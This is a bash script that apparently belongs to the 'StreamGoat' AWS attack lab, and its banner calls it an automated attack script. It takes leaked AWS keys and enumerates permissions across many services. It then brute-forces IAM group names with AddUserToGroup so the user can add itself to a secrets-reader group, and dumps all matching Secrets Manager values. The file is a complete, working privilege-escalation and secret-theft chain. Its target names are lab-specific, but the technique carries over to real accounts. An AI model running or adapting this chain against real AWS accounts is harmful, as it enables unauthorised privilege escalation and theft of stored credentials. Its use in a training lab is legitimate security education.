#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 4              ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Configuring aws credentials\n"
  printf "  • Step 2. Permission enumeration for leaked credentials\n"
  printf "  • Step 3. IAM Introspection & Escalation Discovery\n"
  printf "  • Step 4. Group brute-force + privilege escalation attempt\n"
  printf "  • Step 5. Dumping secrets from Secrets Manager\n"

}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in aws curl jq zip; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
#############################################
# Step 1. Configuring aws credentials
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring aws credentials to use awscli  ===" "${RESET}"
is_valid_keys() {
  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
  local rc=0 out

  # 1) Ensure no env creds override our profile
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
  PROFILE="streamgoat-scenario-4"

  # 2) Write creds to a dedicated profile (avoid clobbering 'default')
  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
  aws configure set region                "$region" --profile "$PROFILE"

  # 3) Force the call to use our profile
  spin_start "Validating credentials via STS"
  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
  spin_stop

  if [ "$rc" -ne 0 ]; then
    return 1
  fi

  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"

  return 0
}

step "Starting point configuration"
while :; do
  read -r -p "Enter leaked AWS key: " AWSKEY_USER
  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
    break
  else
    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
  fi
done
printf "\n"
read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# Step 2. Permission enumeration for leaked credentials
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"

# init colors (portable)

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}

# Identity/context
try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
try "IAM List Roles"  aws iam list-roles --profile "$PROFILE"

# Inventory
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

printf "\nOK, it seems our permissions are quite limited. Let's try to get some more info about our user...\n"
printf "\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# Step 3. IAM Introspection & Escalation Discovery
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. IAM Introspection & Escalation Discovery  ===" "${RESET}"

PROFILE="streamgoat-scenario-4"

# Step 3.1 Who Am I
step "Resolving current identity..."
IDENTITY=$(aws sts get-caller-identity --profile "$PROFILE" --output json)

USER_ARN=$(echo "$IDENTITY" | jq -r '.Arn')
ACCOUNT_ID=$(echo "$IDENTITY" | jq -r '.Account')
USER_ID=$(echo "$IDENTITY" | jq -r '.UserId')
USER_NAME=$(basename "$USER_ARN")

ok "IAM User: ${YELLOW}${USER_NAME}${RESET}"
info "  ARN       : $USER_ARN"
info "  Account   : $ACCOUNT_ID"
info "  UserId    : $USER_ID"

# Step 3.2 List groups for user (we *do* have this permission)
step "Getting group memberships for user: ${YELLOW}${USER_NAME}${RESET}"
USER_GROUPS=$(aws iam list-groups-for-user --user-name "$USER_NAME" --profile "$PROFILE" | jq -r '.Groups[].GroupName')

if [ -z "$USER_GROUPS" ]; then
  err "No groups found for user $USER_NAME"
else
  ok "Found $(echo "$USER_GROUPS" | wc -l) group(s):"
  echo "$USER_GROUPS" | sed 's/^/  - /'
fi

# Step 3.3 Enumerate policies for each group
for group in $USER_GROUPS; do
  step "Inspecting policies for group: ${CYAN}${group}${RESET}"

  # Inline policies
  INLINE_POLICIES=$(aws iam list-group-policies --group-name "$group" --profile "$PROFILE" | jq -r '.PolicyNames[]?')
  if [ -n "$INLINE_POLICIES" ]; then
    ok "Inline policies found:"
    for policy_name in $INLINE_POLICIES; do
      echo "  - $policy_name"
      aws iam get-group-policy --group-name "$group" --policy-name "$policy_name" --profile "$PROFILE" | jq '.PolicyDocument'
    done
  else
    info "No inline policies found on $group"
  fi

  # Attached managed policies
  MANAGED=$(aws iam list-attached-group-policies --group-name "$group" --profile "$PROFILE" | jq -r '.AttachedPolicies[].PolicyArn')

  if [ -n "$MANAGED" ]; then
    ok "Managed policies attached:"
    for policy_arn in $MANAGED; do
      echo "  - $policy_arn"
      VERSION_ID=$(aws iam get-policy --policy-arn "$policy_arn" --profile "$PROFILE" | jq -r '.Policy.DefaultVersionId')
      aws iam get-policy-version --policy-arn "$policy_arn" --version-id "$VERSION_ID" --profile "$PROFILE" | jq '.PolicyVersion.Document'
    done
  else
    info "No managed policies attached to $group"
  fi
done

printf "\nWhat we can do with this information? The interesting permissions here is ${YELLOW}iam:AddUserToGroup${RESET}. We can add ourself to any other group which start with prefix ${YELLOW}StreamGoat-Group${RESET}\n"
read -r -p "But we need to know group name. Lets try get the list of groups. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
# Step 3.4 Attempt to list all group names (expected to fail)

step "Trying to enumerate all IAM groups (should fail unless overly permissive)"
try "IAM ListGroups" aws iam list-groups --profile "$PROFILE" --output json

printf "\nWell, this means we can not know if there is any other groups. But we may quess and try to bruteforce performing AddUserToGroup operation. If we receive an error - group doesn't exist. But if no error we have some luck.\n"
printf "\n"
read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# Step 4. Group brute-force + privilege escalation attempt
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Group Name Brute-force & Self-Add  ===" "${RESET}"

# List of guessed groups (only one is real)
GROUP_GUESSES=(
  "StreamGoat-Group-finance"
  "StreamGoat-Group-devops"
  "StreamGoat-Group-admin"
  "StreamGoat-Group-secretreaders"  # <-- This is the real one
  "StreamGoat-Group-hr"
  "StreamGoat-Group-data"
  "StreamGoat-Group-auditors"
  "StreamGoat-Group-infra"
  "StreamGoat-Group-support"
  "StreamGoat-Group-analytics"
)

step "Attempting to add current user (${YELLOW}${USER_NAME}${RESET}) to guessed groups"

for group in "${GROUP_GUESSES[@]}"; do
  try "AddUserToGroup: $group" \
    aws iam add-user-to-group \
      --group-name "$group" \
      --user-name "$USER_NAME" \
      --profile "$PROFILE"
done

# Step 4b: Check current group memberships (again)
step "Re-checking group memberships for user: ${YELLOW}${USER_NAME}${RESET} (after brute-force)"

USER_GROUPS_JSON=$(aws iam list-groups-for-user --user-name "$USER_NAME" --profile "$PROFILE")
USER_GROUP_LIST=($(echo "$USER_GROUPS_JSON" | jq -r '.Groups[].GroupName'))

if [ "${#USER_GROUP_LIST[@]}" -eq 0 ]; then
  err "No groups found for user $USER_NAME"
else
  ok "Now a member of ${#USER_GROUP_LIST[@]} group(s):"
  for g in "${USER_GROUP_LIST[@]}"; do
    echo "  - $g"
  done
fi

printf "\nPerfect! We just added ourself to the group ${YELLOW}StreamGoat-Group-secretreaders${RESET}.\n"
read -r -p "Lets check which permissions this group gives us. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

# Step 4c: Inspect newly joined privileged group
TARGET_GROUP="StreamGoat-Group-secretreaders"
step "Inspecting policies for newly joined group: ${YELLOW}${TARGET_GROUP}${RESET}"

# Inline policies
INLINE_POLICIES=$(aws iam list-group-policies --group-name "$TARGET_GROUP" --profile "$PROFILE" | jq -r '.PolicyNames[]?')

if [ -n "$INLINE_POLICIES" ]; then
  ok "Inline policies found:"
  for policy_name in $INLINE_POLICIES; do
    echo "  - $policy_name"
    aws iam get-group-policy --group-name "$TARGET_GROUP" --policy-name "$policy_name" --profile "$PROFILE" | jq '.PolicyDocument'
  done
else
  info "No inline policies found on $TARGET_GROUP"
fi

# Attached managed policies
MANAGED_POLICIES=$(aws iam list-attached-group-policies --group-name "$TARGET_GROUP" --profile "$PROFILE" | jq -r '.AttachedPolicies[].PolicyArn')

if [ -n "$MANAGED_POLICIES" ]; then
  ok "Managed policies attached:"
  for policy_arn in $MANAGED_POLICIES; do
    echo "  - $policy_arn"
    VERSION_ID=$(aws iam get-policy --policy-arn "$policy_arn" --profile "$PROFILE" | jq -r '.Policy.DefaultVersionId')
    aws iam get-policy-version --policy-arn "$policy_arn" --version-id "$VERSION_ID" --profile "$PROFILE" | jq '.PolicyVersion.Document'
  done
else
  info "No managed policies attached to $TARGET_GROUP"
fi

printf "\n"
read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# Step 5. Dumping secrets from Secrets Manager
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. SecretsManager Dump (StreamGoat-*)  ===" "${RESET}"

step "Enumerating secrets"

SECRET_NAMES=($(aws secretsmanager list-secrets \
  --profile "$PROFILE" \
  --query "SecretList[?starts_with(Name, 'StreamGoat-')].Name" \
  --output text))

if [ "${#SECRET_NAMES[@]}" -eq 0 ]; then
  err "No secrets found with prefix 'StreamGoat-'"
else
  ok "Found ${#SECRET_NAMES[@]} secrets:"
  for secret in "${SECRET_NAMES[@]}"; do
    echo "  - $secret"
  done
fi

step "Dumping secret values..."

for secret in "${SECRET_NAMES[@]}"; do
  echo -e "\n${BOLD}${YELLOW}[+] Dumping: $secret${RESET}"
  VALUE=$(aws secretsmanager get-secret-value \
    --secret-id "$secret" \
    --profile "$PROFILE" \
    --query 'SecretString' \
    --output text 2>/dev/null)

  if [ -n "$VALUE" ]; then
    echo "$VALUE" | jq . || echo "$VALUE"
    ok "Dumped: $secret"
  else
    err "Failed to dump: $secret"
  fi
done
printf "\n"
read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
